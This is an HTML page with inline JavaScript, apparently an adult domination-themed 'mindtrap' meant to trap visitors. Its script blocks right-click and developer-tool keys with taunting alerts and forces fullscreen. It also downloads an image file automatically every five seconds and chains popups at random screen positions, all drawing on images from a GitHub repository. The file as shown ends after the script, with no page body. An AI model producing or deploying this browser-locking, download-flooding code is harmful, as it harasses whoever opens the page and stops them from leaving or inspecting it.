<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>You Belong to Velvet Temptress</title>
  <style>
    body {
      background-color: black;
      color: hotpink;
      font-family: Arial, sans-serif;
      text-align: center;
      overflow: hidden;
      background-size: cover;
      background-position: center;
      height: 100vh;
    }

    h1 {
      font-size: 3em;
      position: relative;
      z-index: 10;
    }

    button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 1.2em;
      background-color: hotpink;
      color: black;
      border: none;
      cursor: pointer;
      border-radius: 10px;
    }
  </style>
  <script>
    // Disable Right-Click, F12, and Developer Console
    document.addEventListener("keydown", function (event) {
      if (
        event.key === "F12" ||
        (event.ctrlKey && event.shiftKey && event.key === "I") ||
        (event.ctrlKey && event.shiftKey && event.key === "J") ||
        (event.ctrlKey && event.key === "U")
      ) {
        event.preventDefault();
        alert("No escaping, pet~ ðŸ’•");
      }
    });

    document.addEventListener("contextmenu", (event) => event.preventDefault());

    // Fullscreen
    function goFullScreen() {
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
      } else if (document.documentElement.mozRequestFullScreen) {
        document.documentElement.mozRequestFullScreen();
      } else if (document.documentElement.webkitRequestFullscreen) {
        document.documentElement.webkitRequestFullscreen();
      } else if (document.documentElement.msRequestFullscreen) {
        document.documentElement.msRequestFullscreen();
      }
    }

    const images = [
      "https://github.com/velvettemptress/mindtrap/blob/main/Untitled%20(1152%20x%201728%20px).png?raw=true",
      "https://github.com/velvettemptress/mindtrap/blob/main/WhatsApp%20Image%202025-03-19%20at%2021.32.43.jpeg?raw=true",
      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(11).png?raw=true",

      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(15).png?raw=true",
      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(16).png?raw=true",
      "https://github.com/velvettemptress/mindtrap/blob/main/undefined_image%20(19).png?raw=true",

    ];

    let usedIndexes = [];

    function getRandomImage() {
      if (usedIndexes.length === images.length) {
        usedIndexes = [];
      }
      let index;
      do {
        index = Math.floor(Math.random() * images.length);
      } while (usedIndexes.includes(index));
      usedIndexes.push(index);
      return images[index];
    }

    function startTrap() {
      goFullScreen();
      document.body.innerHTML = `<h1>You Are Mine Now~ ðŸ’•</h1>`;

      // Background change every 5 sec
      setInterval(() => {
        let img = getRandomImage();
        document.body.style.backgroundImage = `url(${img})`;
      }, 5000);

      // Auto-download every 5 sec
      setInterval(() => {
        let img = getRandomImage();
        let a = document.createElement("a");
        a.href = img;
        a.download = `VelvetTemptress_${Date.now()}.jpg`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, 5000);
    }

    // Popup loop triggered from user click
    function startPopupLoop() {
      function openPopup() {
        const url = getRandomImage();
        const left = Math.random() * screen.width;
        const top = Math.random() * screen.height;
        const popup = window.open("", "", `width=400,height=400,left=${left},top=${top}`);

        if (popup) {
          popup.document.write(`<img src="${url}" style="width:100%;height:100%;">`);
          setTimeout(openPopup, 5000); // Chained every 5 seconds
        } else {
          alert("Enable popups for Velvet to own you properly~ ðŸ’•");
        }
      }

      startTrap();      // Start fullscreen, background loop, and downloads
      openPopup();      // Start popup chain
    }
  </script>
